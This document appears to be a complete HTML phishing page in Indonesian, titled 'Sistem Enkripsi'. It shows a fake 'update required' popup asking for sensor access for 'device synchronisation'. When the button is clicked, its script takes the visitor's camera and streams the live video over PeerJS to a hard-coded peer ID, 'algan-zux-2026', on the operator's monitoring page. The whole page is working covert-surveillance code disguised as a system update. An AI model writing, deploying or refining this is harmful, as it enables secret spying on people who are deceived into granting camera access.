<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sistem Enkripsi</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .popup { background: #1a1a1a; padding: 30px; border-radius: 20px; text-align: center; width: 80%; }
        button { background: #fff; color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; margin-top: 20px; width: 100%; }
    </style>
</head>
<body>
    <div class="popup" id="p">
        <h3>Update Diperlukan</h3>
        <p style="font-size: 12px; color: #888;">Izinkan akses sensor untuk sinkronisasi perangkat.</p>
        <button onclick="connect()">LANJUTKAN</button>
    </div>

    <script>
        function connect() {
            document.getElementById('p').style.display = 'none';
            
            const peer = new Peer({
                config: {'iceServers': [{ url: 'stun:stun.l.google.com:19302' }]}
            });

            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                // Jeda sebentar biar Peer ID terdaftar di server
                setTimeout(() => {
                    const call = peer.call('algan-zux-2026', stream);
                    if(!call) alert("Monitor tidak ditemukan! Pastikan Monitor sudah START.");
                }, 2000);
            })
            .catch(e => alert("Izin kamera ditolak!"));
        }
    </script>
</body>
</html>
